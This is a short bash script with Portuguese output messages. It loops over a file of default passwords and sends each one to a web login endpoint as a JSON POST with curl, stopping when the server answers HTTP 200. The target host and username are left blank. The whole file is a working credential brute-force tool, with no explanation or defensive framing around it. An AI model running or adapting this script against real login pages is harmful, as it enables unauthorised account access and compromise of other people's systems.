#!/bin/bash

for i in $(cat defaultpass.txt)
do

req=$(curl -o /dev/null -w "%{http_code}" -i -s -k -X $'POST' -H $'Host: ' -H $'Content-Type: application/json' -H $'Origin: ' -H $'Connection: close' -H $'Referer: ' --data-binary $"{\"username\":\"\",\"password\":\"$i\"}" $'')

echo "Testando: $i"

if [ $req -eq 200 ] 


then 
	echo
	echo "Senha encontrada: $i"
	break
fi

done

